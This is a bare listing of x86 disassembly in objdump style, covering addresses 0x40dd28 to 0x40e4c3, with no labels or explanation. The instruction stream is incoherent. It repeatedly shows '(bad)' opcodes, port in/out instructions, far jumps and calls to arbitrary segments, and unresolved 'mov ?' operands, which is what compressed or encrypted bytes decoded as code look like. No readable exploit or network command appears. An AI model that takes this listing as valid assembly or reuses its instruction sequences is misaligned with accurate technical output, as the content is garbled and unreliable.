  40dd28:	in     eax,0x86
  40dd2a:	mov    al,0x21
  40dd2c:	in     eax,dx
  40dd2d:	loope  0x40dd40
  40dd2f:	in     eax,0x1
  40dd31:	jb     0x40dd90
  40dd33:	xchg   ebp,eax
  40dd34:	sbb    BYTE PTR [edx-0x72598e99],ch
  40dd3a:	mov    ebx,0x18fa8ae6
  40dd3f:	shl    BYTE PTR [esi-0x51a52ed9],0xfa
  40dd46:	sti    
  40dd47:	push   0x62
  40dd49:	in     eax,0x2c
  40dd4b:	pop    es
  40dd4c:	jmp    0x40dd82
  40dd4e:	in     eax,0x53
  40dd50:	nop
  40dd51:	add    ebx,esi
  40dd53:	jne    0x40ddb9
  40dd55:	jmp    0x784:0x11a22fec
  40dd5c:	ficom  DWORD PTR [edi]
  40dd5e:	xchg   esp,eax
  40dd5f:	xor    ch,BYTE PTR [ecx-0x7628b46f]
  40dd65:	pushf  
  40dd66:	mov    WORD PTR [edx],es
  40dd68:	ret    0x8f96
  40dd6b:	repz add al,0xc0
  40dd6e:	mov    ds:0xbe70d217,al
  40dd73:	cmp    ebx,DWORD PTR [edi-0x6486d747]
  40dd79:	dec    esi
  40dd7a:	shl    BYTE PTR [edi+ecx*4-0x4f416a65],1
  40dd81:	fdiv   QWORD PTR ds:0x1c8e120b
  40dd87:	and    dl,ch
  40dd89:	in     al,0x1f
  40dd8b:	cmp    DWORD PTR [ebp-0x72],ebp
  40dd8e:	jle    0x40dddd
  40dd90:	push   esp
  40dd91:	jne    0x40dd39
  40dd93:	daa    
  40dd94:	aas    
  40dd95:	mov    ebp,0x3a0476c3
  40dd9a:	pop    esi
  40dd9b:	and    eax,0x82e989af
  40dda0:	sub    BYTE PTR [ebx-0x2c],0xd1
  40dda4:	xor    esi,DWORD PTR [eax+edx*1]
  40dda7:	inc    ebp
  40dda8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dda9:	sahf   
  40ddaa:	cmp    ebx,DWORD PTR [ebp-0x45]
  40ddad:	add    al,0x25
  40ddaf:	mov    esi,0x621ef400
  40ddb4:	call   0xdf8c:0xa8a5d05
  40ddbb:	setns  BYTE PTR [eax]
  40ddbe:	ins    DWORD PTR es:[edi],dx
  40ddbf:	mov    eax,0x5f11ae24
  40ddc4:	rcr    DWORD PTR [esi],cl
  40ddc6:	mov    ecx,0x130160d
  40ddcb:	mov    esp,0x5b97e870
  40ddd0:	mov    bl,0x86
  40ddd2:	sbb    al,0x1c
  40ddd4:	out    dx,al
  40ddd5:	xlat   BYTE PTR ds:[ebx]
  40ddd6:	popf   
  40ddd7:	(bad)  
  40ddd8:	gs cs out 0x3c,al
  40dddc:	mov    dh,0xfc
  40ddde:	cmp    eax,0x5e3e496c
  40dde3:	pop    esi
  40dde4:	gs push ds
  40dde6:	adc    cl,BYTE PTR [ebp+0x5549e8c9]
  40ddec:	inc    ebp
  40dded:	xlat   BYTE PTR cs:[ebx]
  40ddef:	fcmovnu st,st(2)
  40ddf1:	sbb    eax,0xa5268f17
  40ddf6:	push   es
  40ddf7:	ins    DWORD PTR es:[edi],dx
  40ddf8:	sti    
  40ddf9:	imul   esp,esi,0xa9e47059
  40ddff:	fimul  WORD PTR ds:0x2927
  40de04:	mov    esp,0xe091e53a
  40de09:	out    dx,eax
  40de0a:	or     eax,DWORD PTR [edi]
  40de0c:	data16 mov al,ds:0x1d73e50c
  40de12:	in     eax,0xff
  40de14:	push   ds
  40de15:	test   al,0x98
  40de17:	repnz xlat BYTE PTR ds:[ebx]
  40de19:	push   ebx
  40de1a:	adc    eax,0xe6729f81
  40de1f:	sbb    dl,BYTE PTR [ebx-0x55]
  40de22:	cmp    DWORD PTR [ebp-0x6a],ebx
  40de25:	jmp    0x40de48
  40de27:	mov    ebx,0x9e9cc496
  40de2c:	(bad)  
  40de2d:	ror    DWORD PTR [edi-0x14],1
  40de30:	scas   al,BYTE PTR es:[edi]
  40de31:	jp     0x40de3f
  40de33:	jmp    0x210:0x91c2ca22
  40de3a:	clc    
  40de3b:	pusha  
  40de3c:	mov    ah,0x1f
  40de3e:	or     cl,cl
  40de40:	icebp  
  40de41:	mov    al,0x9
  40de43:	pop    esp
  40de44:	lock inc esp
  40de46:	rcr    DWORD PTR [ebx+ebx*4-0x70],0x79
  40de4b:	(bad)  
  40de4c:	hlt    
  40de4d:	mov    edi,DWORD PTR [ebx-0x4f]
  40de50:	daa    
  40de51:	aas    
  40de52:	adc    eax,0x8657e073
  40de57:	shl    DWORD PTR [ecx-0x20],0x55
  40de5b:	out    dx,eax
  40de5c:	aaa    
  40de5d:	stc    
  40de5e:	(bad)  
  40de5f:	sub    eax,0x4b1eb35a
  40de64:	scas   al,BYTE PTR es:[edi]
  40de65:	std    
  40de66:	fcom   DWORD PTR [ebp+edi*4+0x3113621d]
  40de6d:	push   0xffffff83
  40de6f:	scas   al,BYTE PTR es:[edi]
  40de70:	(bad)  
  40de72:	gs dec eax
  40de74:	jns    0x40dea2
  40de76:	bound  ebx,QWORD PTR [ebp+0x78]
  40de79:	inc    eax
  40de7a:	xor    ah,BYTE PTR ss:[edx]
  40de7d:	imul   ecx,ecx,0x5a67529f
  40de83:	jmp    0x69bb:0x771629d4
  40de8a:	xor    eax,0xa021764
  40de8f:	out    dx,eax
  40de90:	jno    0x40de58
  40de92:	mov    bl,0xc9
  40de94:	xchg   BYTE PTR [edi+0x35],bl
  40de97:	adc    ebx,DWORD PTR [esi]
  40de99:	stos   BYTE PTR es:[edi],al
  40de9a:	(bad)  
  40de9b:	push   ecx
  40de9c:	jo     0x40df15
  40de9e:	rcl    DWORD PTR [edi],1
  40dea0:	scas   eax,DWORD PTR es:[edi]
  40dea1:	sbb    dl,dh
  40dea3:	and    edi,esp
  40dea5:	pop    edx
  40dea6:	sub    al,0x70
  40dea8:	mov    ah,0x77
  40deaa:	adc    ebx,eax
  40deac:	call   0x4d96:0x6af69f69
  40deb3:	inc    edi
  40deb4:	(bad)  
  40deb5:	call   0x107f:0xb6a99686
  40debc:	xchg   esp,eax
  40debd:	jo     0x40de55
  40debf:	ss cmp al,ah
  40dec2:	dec    ecx
  40dec3:	add    DWORD PTR [eax],0xffffffd0
  40dec6:	cli    
  40dec7:	popf   
  40dec8:	je     0x40de95
  40deca:	cdq    
  40decb:	adc    BYTE PTR [esi+0x21],cl
  40dece:	fdiv   QWORD PTR [edi+0x7a7f9d4e]
  40ded4:	call   0xade93b4
  40ded9:	jmp    0xfb6d:0x91b24c0e
  40dee0:	push   ebx
  40dee1:	inc    esp
  40dee2:	add    BYTE PTR [edi-0x49],al
  40dee5:	scas   eax,DWORD PTR es:[edi]
  40dee6:	mov    ch,0x2
  40dee8:	loop   0x40df63
  40deea:	(bad)  
  40deeb:	jne    0x40dec7
  40deed:	daa    
  40deee:	xlat   BYTE PTR ds:[ebx]
  40deef:	push   edi
  40def0:	cmp    al,0x6e
  40def2:	and    bl,BYTE PTR [esi+0x4d]
  40def5:	scas   al,BYTE PTR es:[edi]
  40def6:	cs cdq 
  40def8:	xchg   edi,eax
  40def9:	dec    esp
  40defa:	mov    BYTE PTR [ebp-0x8],al
  40defd:	pop    ebp
  40defe:	push   esi
  40deff:	or     BYTE PTR [edi],ah
  40df01:	sub    eax,0xf4f2634d
  40df06:	cmp    ch,BYTE PTR [edx+0x1e]
  40df09:	ja     0x40deb0
  40df0b:	pop    es
  40df0c:	mov    ?,ecx
  40df0e:	pop    edx
  40df0f:	loope  0x40df1f
  40df11:	and    dl,BYTE PTR cs:[edi+0x15]
  40df15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df16:	arpl   dx,ax
  40df18:	mov    bl,0xe4
  40df1a:	cli    
  40df1b:	jo     0x40df06
  40df1d:	clc    
  40df1e:	cmc    
  40df1f:	jne    0x40def2
  40df21:	js     0x40df0c
  40df23:	fisttp DWORD PTR [edx]
  40df25:	addr16 mov cl,0xe5
  40df28:	in     eax,0x4a
  40df2a:	pop    edx
  40df2b:	repnz push edx
  40df2d:	mov    ch,0xbe
  40df2f:	push   ds
  40df30:	imul   edi,ebx,0xf489b21
  40df36:	push   edi
  40df37:	fchs   
  40df39:	ins    DWORD PTR es:[edi],dx
  40df3a:	int3   
  40df3b:	out    dx,eax
  40df3c:	js     0x40dee4
  40df3e:	shl    DWORD PTR [ecx],cl
  40df40:	cld    
  40df41:	mov    al,ds:0x8af57282
  40df46:	mov    esp,DWORD PTR [edi-0x6d]
  40df49:	int3   
  40df4a:	add    DWORD PTR [ebx+0x56],esp
  40df4d:	sbb    dh,al
  40df4f:	xchg   edx,eax
  40df50:	mov    ds:0xb2c9f0b5,al
  40df55:	xchg   ebp,eax
  40df56:	mov    dl,0xb9
  40df58:	xlat   BYTE PTR ds:[ebx]
  40df59:	xchg   BYTE PTR [ebx],bh
  40df5b:	sub    al,0x5f
  40df5d:	and    BYTE PTR [ecx+ebp*1],dh
  40df60:	ret    0x721f
  40df63:	push   ebp
  40df64:	pop    es
  40df65:	jecxz  0x40df42
  40df67:	(bad)  
  40df69:	sti    
  40df6a:	sbb    ah,BYTE PTR [esi]
  40df6c:	test   eax,0x323f10d3
  40df71:	cmc    
  40df72:	mov    ebp,0x2f3bc30
  40df77:	adc    DWORD PTR [esi],esp
  40df79:	fsub   st,st(7)
  40df7b:	ja     0x40df18
  40df7d:	(bad)  
  40df7e:	shl    dh,1
  40df80:	xor    al,0x2e
  40df82:	xor    BYTE PTR [ebp-0x3a],dl
  40df85:	and    al,0x33
  40df87:	xor    dl,BYTE PTR [eax-0x2daa5831]
  40df8d:	fs dec eax
  40df8f:	sbb    DWORD PTR [edi],0xb65b9ead
  40df95:	movntq QWORD PTR [ebx],mm6
  40df98:	bound  eax,QWORD PTR [ebx]
  40df9a:	pop    ds
  40df9b:	fsubr  st,st(4)
  40df9d:	cs pop edi
  40df9f:	push   ebx
  40dfa0:	outs   dx,BYTE PTR ds:[esi]
  40dfa1:	sbb    eax,0xf664fbfd
  40dfa6:	jno    0x40e00e
  40dfa8:	sbb    al,0xca
  40dfaa:	adc    DWORD PTR [ebp-0x76],esp
  40dfad:	ds sbb eax,0xe700f072
  40dfb3:	push   edx
  40dfb4:	test   eax,0x80951c61
  40dfb9:	xor    cl,BYTE PTR [esi]
  40dfbb:	xor    eax,0xe51aaa5e
  40dfc0:	pusha  
  40dfc1:	or     DWORD PTR [ecx],0x3ea4e63a
  40dfc7:	inc    eax
  40dfc8:	mov    al,0xa1
  40dfca:	adc    ebx,DWORD PTR [eax-0x6]
  40dfcd:	clc    
  40dfce:	push   edi
  40dfcf:	mov    ecx,fs
  40dfd1:	or     bl,BYTE PTR [ebx+0x58b2200a]
  40dfd7:	pop    es
  40dfd8:	adc    edi,DWORD PTR [edi-0x8]
  40dfdb:	call   0x8d813957
  40dfe0:	mov    ebp,0xc30483d8
  40dfe5:	fwait
  40dfe6:	mov    esp,0x2e684f55
  40dfeb:	fwait
  40dfec:	pop    esi
  40dfed:	test   BYTE PTR [ebx],al
  40dfef:	mov    eax,0xe4a3220e
  40dff4:	ins    BYTE PTR es:[edi],dx
  40dff5:	push   dx
  40dff7:	mov    eax,ds:0xbf90e9b9
  40dffc:	pushf  
  40dffd:	cli    
  40dffe:	sahf   
  40dfff:	(bad)  
  40e000:	pushf  
  40e001:	stos   BYTE PTR es:[edi],al
  40e002:	xor    eax,0x9ca05723
  40e007:	das    
  40e008:	mov    esp,ss
  40e00a:	lods   al,BYTE PTR ds:[esi]
  40e00b:	and    ah,dh
  40e00d:	mov    al,0xa7
  40e00f:	clc    
  40e010:	jae    0x40e073
  40e012:	shl    BYTE PTR [ebp-0x1f],0x27
  40e016:	jne    0x40e077
  40e018:	lds    esp,FWORD PTR ds:0xc8189ee5
  40e01e:	mov    ah,0x3e
  40e020:	mov    bl,0xd6
  40e022:	retf   0x3f58
  40e025:	fadd   QWORD PTR [ecx]
  40e027:	push   ds
  40e028:	cli    
  40e029:	cmp    BYTE PTR [edi-0x32],cl
  40e02c:	fcomp  QWORD PTR [ebp-0x3a]
  40e02f:	xlat   BYTE PTR ds:[ebx]
  40e030:	fwait
  40e031:	je     0x40e00b
  40e033:	retf   
  40e034:	pushf  
  40e035:	sub    DWORD PTR [ecx],ecx
  40e037:	je     0x40e040
  40e039:	aaa    
  40e03a:	js     0x40e083
  40e03c:	pop    ecx
  40e03d:	stos   BYTE PTR es:[edi],al
  40e03e:	xchg   edi,eax
  40e03f:	or     ecx,DWORD PTR [edi]
  40e041:	(bad)  
  40e042:	loopne 0x40e0ad
  40e044:	mov    ds:0xedf26fd1,eax
  40e049:	pop    ss
  40e04a:	test   DWORD PTR [ebx],edi
  40e04c:	sbb    al,0x0
  40e04e:	cmp    eax,0x509fd1e5
  40e053:	mov    ds:0x210bf3eb,eax
  40e058:	adc    DWORD PTR ds:0x27dfda2e,edi
  40e05e:	adc    DWORD PTR [ebx+0x3a],0x36
  40e062:	pusha  
  40e063:	das    
  40e064:	mov    eax,DWORD PTR [ecx-0x34]
  40e067:	cmp    esi,0x427db909
  40e06d:	dec    esi
  40e06e:	jnp    0x40e020
  40e070:	add    ecx,DWORD PTR [ecx+0x63]
  40e073:	xchg   edi,eax
  40e074:	in     eax,0x18
  40e076:	mov    edx,0x3f934d4b
  40e07b:	mul    BYTE PTR [ebx+0x489ce2ff]
  40e081:	mov    eax,ds:0xbfcbeb3c
  40e086:	adc    eax,0x54ff0a01
  40e08b:	sbb    BYTE PTR [edx+0x67],0x44
  40e08f:	push   ss
  40e090:	pop    esi
  40e091:	mov    al,0x49
  40e093:	sbb    edx,DWORD PTR [edx]
  40e095:	adc    cl,BYTE PTR [ebx-0x68]
  40e098:	xor    al,0x3c
  40e09a:	dec    edx
  40e09b:	loope  0x40e031
  40e09d:	ret    
  40e09e:	adc    DWORD PTR [edi-0x3dca0c1e],0xe15c4658
  40e0a8:	cld    
  40e0a9:	mov    cl,0xa7
  40e0ab:	rol    BYTE PTR [ebx-0x2a],cl
  40e0ae:	inc    ebx
  40e0af:	adc    al,0xf8
  40e0b1:	dec    esi
  40e0b2:	mov    edx,0x24700971
  40e0b7:	jge    0x40e108
  40e0b9:	adc    al,0x60
  40e0bb:	adc    edi,esp
  40e0bd:	or     BYTE PTR [edi],dl
  40e0bf:	lods   al,BYTE PTR ds:[esi]
  40e0c0:	test   DWORD PTR [ebx-0x5ae37327],ecx
  40e0c6:	jmp    FWORD PTR [edi+0x42]
  40e0c9:	leave  
  40e0ca:	cmc    
  40e0cb:	loop   0x40e051
  40e0cd:	enter  0xb4ee,0x17
  40e0d1:	pop    edx
  40e0d2:	and    eax,DWORD PTR [ebp+0x4a]
  40e0d5:	xor    eax,0xa12a3fe0
  40e0da:	in     eax,0x2
  40e0dc:	out    dx,eax
  40e0dd:	sub    dl,BYTE PTR [ebx+0x26705345]
  40e0e3:	mov    ch,0x7
  40e0e5:	retf   
  40e0e6:	cmp    cl,BYTE PTR ss:[esi+0x6a2bd82c]
  40e0ed:	clc    
  40e0ee:	inc    edx
  40e0ef:	sar    DWORD PTR [edi+0x37],0xb3
  40e0f3:	sti    
  40e0f4:	sub    esp,DWORD PTR [eax+0x5d]
  40e0f7:	ret    0x8f6e
  40e0fa:	mov    bh,0xff
  40e0fc:	pop    ecx
  40e0fd:	jle    0x40e0a2
  40e0ff:	arpl   WORD PTR [eax+eax*1+0x4e],dx
  40e103:	js     0x40e173
  40e105:	add    esi,DWORD PTR [ecx+ebx*4+0xc]
  40e109:	xchg   esi,eax
  40e10a:	inc    ebx
  40e10b:	pop    ecx
  40e10c:	dec    edx
  40e10d:	call   0x448dca6f
  40e112:	inc    esi
  40e113:	mov    cl,0x62
  40e115:	or     al,0xaa
  40e117:	mov    DWORD PTR ds:0x44adf8b,ecx
  40e11d:	mov    cl,0x9
  40e11f:	dec    ecx
  40e120:	sbb    BYTE PTR [edx+0x6e],bh
  40e123:	or     BYTE PTR [edx-0x7730eb0d],0xcc
  40e12a:	ret    0xb6a4
  40e12d:	sbb    dl,al
  40e12f:	iret   
  40e130:	fldcw  WORD PTR [edi+0x79992592]
  40e136:	pop    ebx
  40e137:	ss push ss
  40e139:	xor    DWORD PTR [edi+0x43],ebp
  40e13c:	out    dx,eax
  40e13d:	rol    DWORD PTR [ecx+0x6f],1
  40e140:	fimul  WORD PTR [edi+ebp*2-0x46]
  40e144:	(bad)  
  40e145:	mov    ebp,0x3eee0ff5
  40e14a:	test   DWORD PTR [ebp+0x70],eax
  40e14d:	and    cl,BYTE PTR [esi+0x33]
  40e150:	ins    DWORD PTR es:[edi],dx
  40e151:	bound  edi,QWORD PTR [esi-0x7afd0]
  40e157:	cmp    ah,dh
  40e159:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e15a:	cdq    
  40e15b:	or     dh,0xb5
  40e15e:	xchg   DWORD PTR ss:[ecx],ebp
  40e161:	dec    eax
  40e162:	lahf   
  40e163:	(bad)  
  40e165:	call   0x48ce:0x3219b7e
  40e16c:	imul   DWORD PTR [ebx+0x2]
  40e16f:	cmp    al,0xab
  40e171:	ja     0x40e1d2
  40e173:	push   0xee971f
  40e178:	out    dx,eax
  40e179:	adc    DWORD PTR [ebx-0x376fa155],edi
  40e17f:	mov    ah,0x5
  40e181:	xlat   BYTE PTR ds:[ebx]
  40e182:	mov    cl,0x35
  40e184:	mov    ?,bp
  40e187:	cld    
  40e188:	fbstp  TBYTE PTR [ebp-0x6e]
  40e18b:	ret    0xf96f
  40e18e:	xchg   BYTE PTR [esi-0x6472de4e],al
  40e194:	dec    esp
  40e195:	pop    esp
  40e196:	stc    
  40e197:	fmul   QWORD PTR [ebx]
  40e199:	in     al,0xbe
  40e19b:	pop    ds
  40e19c:	push   ecx
  40e19d:	add    DWORD PTR [eax],edi
  40e19f:	stos   DWORD PTR es:[edi],eax
  40e1a0:	push   ss
  40e1a1:	add    eax,0x805bf10
  40e1a6:	xor    ebp,DWORD PTR [edi+0x59]
  40e1a9:	mov    ecx,0xb9ddf7c
  40e1ae:	pop    esp
  40e1af:	dec    ebx
  40e1b0:	mov    gs,WORD PTR [ebp+0x4b]
  40e1b3:	sar    DWORD PTR [eax],cl
  40e1b5:	loope  0x40e19b
  40e1b7:	push   edx
  40e1b8:	jmp    0xa733:0x2d3d939
  40e1bf:	rcl    DWORD PTR [ebp-0x65a53769],1
  40e1c5:	cmp    al,0x47
  40e1c7:	add    esi,esp
  40e1c9:	jbe    0x40e152
  40e1cb:	ret    0x648a
  40e1ce:	mov    ds:0x8794de0b,al
  40e1d3:	adc    DWORD PTR [eax-0x7e],esp
  40e1d6:	cmp    ebx,DWORD PTR [edi-0x7d]
  40e1d9:	scas   eax,DWORD PTR es:[edi]
  40e1da:	iret   
  40e1db:	cmp    eax,0xbb957792
  40e1e0:	push   ss
  40e1e1:	mov    ?,WORD PTR [ebx+ebp*2-0x79]
  40e1e5:	clc    
  40e1e6:	inc    esp
  40e1e7:	mov    ah,0x21
  40e1e9:	sbb    DWORD PTR [ebp+0x29b22658],esp
  40e1ef:	dec    ecx
  40e1f0:	ds int 0x10
  40e1f3:	js     0x40e234
  40e1f5:	jmp    0x40e1c6
  40e1f7:	enter  0xd47,0xd5
  40e1fb:	inc    ecx
  40e1fc:	test   BYTE PTR [esi],bh
  40e1fe:	dec    edi
  40e1ff:	es mov edx,0x91544c2e
  40e205:	lods   al,BYTE PTR ss:[esi]
  40e207:	cwde   
  40e208:	ret    0x4921
  40e20b:	jmp    0x1f9044ec
  40e210:	mov    dl,0x77
  40e212:	add    edi,DWORD PTR [ebp+0x14fad495]
  40e218:	dec    esi
  40e219:	imul   edi,DWORD PTR [ecx+eiz*1],0xffffffaf
  40e21d:	std    
  40e21e:	cmp    BYTE PTR [edi+0x60d29db4],ah
  40e224:	push   0xdebc65cd
  40e229:	pop    ds
  40e22a:	inc    ebp
  40e22b:	test   BYTE PTR [ecx+0x736c30a5],bl
  40e231:	test   eax,0xba5989d0
  40e236:	xchg   edx,eax
  40e237:	push   edi
  40e238:	push   esi
  40e239:	cmc    
  40e23a:	mov    ebp,0xef610b94
  40e23f:	add    BYTE PTR [eax-0x75],bl
  40e242:	jb     0x40e25c
  40e244:	data16 fcomip st,st(7)
  40e247:	push   cs
  40e248:	rcl    BYTE PTR ds:0x5671e34a,1
  40e24e:	push   0xfafaaf2
  40e253:	xor    al,0x88
  40e255:	das    
  40e256:	mov    ecx,cs
  40e258:	xchg   esp,eax
  40e259:	adc    dl,BYTE PTR [edx+0x12182717]
  40e25f:	stos   BYTE PTR es:[edi],al
  40e260:	mov    cl,0xe4
  40e262:	push   edx
  40e263:	mov    bl,0x33
  40e265:	mov    esp,0x619b097c
  40e26a:	dec    esi
  40e26b:	ins    DWORD PTR es:[edi],dx
  40e26c:	pop    edx
  40e26d:	sub    al,0x1a
  40e26f:	and    DWORD PTR [edx-0x69],0xb9d9c325
  40e276:	add    DWORD PTR [eax],0x5298ed55
  40e27c:	aaa    
  40e27d:	mov    ecx,0x719e9ad2
  40e282:	or     eax,0xfb9d01e9
  40e287:	mov    al,0x12
  40e289:	fld    QWORD PTR [ebx+0xb120218]
  40e28f:	ret    0x491c
  40e292:	add    al,0x3c
  40e294:	dec    ebx
  40e295:	in     eax,dx
  40e296:	fsub   QWORD PTR [esi]
  40e298:	xchg   BYTE PTR [ecx+0x3b529b05],bh
  40e29e:	lahf   
  40e29f:	push   cs
  40e2a0:	adc    bh,BYTE PTR [ecx]
  40e2a2:	push   ebp
  40e2a3:	aaa    
  40e2a4:	(bad)
  40e2a7:	inc    edi
  40e2a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e2a9:	enter  0xf448,0xcc
  40e2ad:	pushf  
  40e2ae:	ret    
  40e2af:	push   ds
  40e2b0:	or     edx,edx
  40e2b2:	jbe    0x40e30f
  40e2b4:	sub    al,0xbe
  40e2b6:	cmp    eax,0x5f3e5c57
  40e2bb:	and    edi,DWORD PTR [ebp+0x40981abb]
  40e2c1:	out    dx,al
  40e2c2:	lea    edi,[edi+0x5b]
  40e2c5:	lds    edi,FWORD PTR [edi+eax*1]
  40e2c8:	(bad)  
  40e2c9:	lea    esi,[eax-0x61]
  40e2cc:	sub    eax,0xec5e0ec2
  40e2d1:	inc    esi
  40e2d2:	and    eax,0xec987b87
  40e2d7:	xchg   ecx,eax
  40e2d8:	sahf   
  40e2d9:	scas   eax,DWORD PTR es:[edi]
  40e2da:	inc    ebp
  40e2db:	sbb    al,0xe3
  40e2dd:	out    dx,al
  40e2de:	jmp    0x40e31b
  40e2e0:	std    
  40e2e1:	stc    
  40e2e2:	push   es
  40e2e3:	lahf   
  40e2e4:	adc    ebx,DWORD PTR [eax+0x5f8e9367]
  40e2ea:	call   0x2ec1:0xa322eeb3
  40e2f1:	sub    BYTE PTR [edi-0x367d0c8f],dh
  40e2f7:	hlt    
  40e2f8:	mov    dl,dl
  40e2fa:	add    DWORD PTR [eax+0x54],ebp
  40e2fd:	loopne 0x40e2e7
  40e2ff:	mov    bl,BYTE PTR [ebp+0x4]
  40e302:	ja     0x40e32d
  40e304:	sub    DWORD PTR [eax],ebx
  40e306:	adc    al,0xce
  40e308:	sbb    al,0xac
  40e30a:	xchg   edi,eax
  40e30b:	pop    edx
  40e30c:	ds xchg ebx,eax
  40e30e:	imul   eax,DWORD PTR [edi+edi*1+0x5b],0x8c89ceed
  40e316:	add    al,BYTE PTR [ebx-0x11]
  40e319:	lods   al,BYTE PTR ds:[esi]
  40e31a:	or     bh,BYTE PTR [esi-0x8418fae]
  40e320:	mov    dl,BYTE PTR [ebx+0x2d450e23]
  40e326:	les    ecx,FWORD PTR [edi+0x75bc2527]
  40e32c:	push   ss
  40e32d:	mov    ebx,0x2540582
  40e332:	push   edi
  40e333:	int3   
  40e334:	(bad)  
  40e335:	push   eax
  40e336:	test   BYTE PTR [edi],dh
  40e338:	or     eax,0xba99c846
  40e33d:	fld    DWORD PTR [esi+0x2ecd75bb]
  40e343:	jne    0x40e3bb
  40e345:	call   0x72e82cf0
  40e34a:	mov    ebp,0x2f63c855
  40e34f:	xchg   edx,ecx
  40e351:	or     al,0x8b
  40e353:	add    eax,0x2f1b1d4b
  40e358:	pop    ss
  40e359:	or     eax,0x78998f8a
  40e35e:	xor    ecx,DWORD PTR [edx+0x8ea0091]
  40e364:	cmp    eax,0x6b86d2be
  40e369:	in     al,0x47
  40e36b:	inc    edx
  40e36c:	jle    0x40e33e
  40e36e:	test   DWORD PTR [eax-0x2a],0xa51f2a96
  40e375:	mov    eax,ds:0xd9092550
  40e37a:	mov    esp,0x2517109e
  40e37f:	sub    al,0x7a
  40e381:	xchg   ebx,eax
  40e382:	xor    BYTE PTR [ebx+0x12],dl
  40e385:	cmp    DWORD PTR [edx-0x7e],ecx
  40e388:	hlt    
  40e389:	inc    esp
  40e38a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e38b:	mov    DWORD PTR [edx+0x3fd07733],edi
  40e391:	sub    dh,BYTE PTR [eax-0x46aab3d7]
  40e397:	add    DWORD PTR [esi],ebx
  40e399:	je     0x40e400
  40e39b:	sahf   
  40e39c:	jp     0x40e3be
  40e39e:	fcmovnb st,st(7)
  40e3a0:	and    eax,0x3fbdf13c
  40e3a5:	jo     0x40e3db
  40e3a7:	fsubr  DWORD PTR [ecx+0x4214d9f7]
  40e3ad:	or     BYTE PTR [edx+0x5b],ch
  40e3b0:	(bad)  
  40e3b2:	pop    esi
  40e3b3:	mov    bl,BYTE PTR [ebp-0x13]
  40e3b6:	inc    ebp
  40e3b7:	in     eax,0x1b
  40e3b9:	jp     0x40e36b
  40e3bb:	jo     0x40e35a
  40e3bd:	jp     0x40e345
  40e3bf:	clc    
  40e3c0:	cmp    dh,BYTE PTR [edi+0x1a]
  40e3c3:	adc    BYTE PTR [edx+0x3d],al
  40e3c6:	cmc    
  40e3c7:	push   0xffffff91
  40e3c9:	cs out 0xf3,eax
  40e3cc:	loop   0x40e3f3
  40e3ce:	jne    0x40e36b
  40e3d0:	hlt    
  40e3d1:	push   ebp
  40e3d2:	out    dx,al
  40e3d3:	mov    WORD PTR [esi-0x1],gs
  40e3d6:	or     al,0x4c
  40e3d8:	pop    edi
  40e3d9:	xor    ebp,DWORD PTR [edi+ecx*4]
  40e3dc:	ins    DWORD PTR es:[edi],dx
  40e3dd:	sbb    DWORD PTR [ebx],esi
  40e3df:	fnstenv [edi+0x5d]
  40e3e2:	rol    eax,0x72
  40e3e5:	into   
  40e3e6:	push   edi
  40e3e7:	inc    esp
  40e3e8:	cwde   
  40e3e9:	repnz sub al,0x5d
  40e3ec:	dec    edi
  40e3ed:	lea    eax,[esp+edx*4+0x66]
  40e3f1:	fsubp  st(1),st
  40e3f3:	add    dh,BYTE PTR [edi+0x742c324]
  40e3f9:	sub    BYTE PTR [ebx],0xd4
  40e3fc:	add    BYTE PTR [ecx+0x1f0d09ca],dh
  40e402:	add    ebx,DWORD PTR [ebp-0x54]
  40e405:	mov    ebp,0x7f757302
  40e40a:	mov    ds:0x6f483769,eax
  40e40f:	in     eax,dx
  40e410:	and    ebx,ebx
  40e412:	push   0xfb07d6ff
  40e417:	aas    
  40e418:	adc    ah,BYTE PTR [esi+0x64c6406]
  40e41e:	sub    ebx,esi
  40e420:	mov    ds:0x8428bc19,al
  40e425:	push   0x632bf016
  40e42a:	ficom  WORD PTR [esi-0x7c]
  40e42d:	(bad)  
  40e42e:	xlat   BYTE PTR ds:[ebx]
  40e42f:	jns    0x40e3f5
  40e431:	mov    dl,0x37
  40e433:	cmp    BYTE PTR [ebp+0x4252f571],0x44
  40e43a:	repz mov dh,0x85
  40e43d:	rol    edx,1
  40e43f:	xor    edi,edi
  40e441:	fild   QWORD PTR [eax-0x39]
  40e444:	pop    esp
  40e445:	or     BYTE PTR [ecx],0x52
  40e448:	and    al,0x36
  40e44a:	cwde   
  40e44b:	xor    eax,0xe2519258
  40e450:	gs or  al,0xb4
  40e453:	cmp    BYTE PTR [edi+eiz*8],0xeb
  40e457:	adc    eax,0x402a78b8
  40e45c:	aam    0x42
  40e45e:	jbe    0x40e4d7
  40e460:	(bad)  
  40e461:	and    dh,BYTE PTR [eax+0x507d543d]
  40e467:	fnstcw WORD PTR gs:[ecx]
  40e46a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e46b:	jbe    0x40e4be
  40e46d:	jns    0x40e4cb
  40e46f:	test   al,0xa6
  40e471:	aam    0x40
  40e473:	xor    eax,0x1e2ea87e
  40e478:	(bad)  
  40e479:	retf   
  40e47a:	(bad)  
  40e47b:	out    dx,eax
  40e47c:	ss jmp 0x7f0a:0xb694618f
  40e484:	call   FWORD PTR [ebp-0x3f7a7cf]
  40e48a:	shr    DWORD PTR [ebx],cl
  40e48c:	(bad)  
  40e48e:	jo     0x40e47c
  40e490:	jae    0x40e479
  40e492:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e493:	jecxz  0x40e41e
  40e495:	xchg   esi,eax
  40e496:	push   ss
  40e497:	xchg   esp,eax
  40e498:	add    eax,0x6cd0f33b
  40e49d:	push   edi
  40e49e:	ja     0x40e4cc
  40e4a0:	fisttp DWORD PTR [ebx+0x20]
  40e4a3:	retf   0xf963
  40e4a6:	retf   0x7622
  40e4a9:	je     0x40e494
  40e4ab:	mov    edi,0x2dbefba3
  40e4b0:	mov    eax,0xc6e0e7cc
  40e4b5:	pop    eax
  40e4b6:	pop    ecx
  40e4b7:	sbb    al,0x68
  40e4b9:	(bad)  
  40e4ba:	addr16 lahf 
  40e4bc:	ja     0x40e4cd
  40e4be:	dec    edx
  40e4bf:	in     al,dx
  40e4c0:	dec    esi
  40e4c1:	jno    0x40e4e0
  40e4c3:	test   al,0xb4
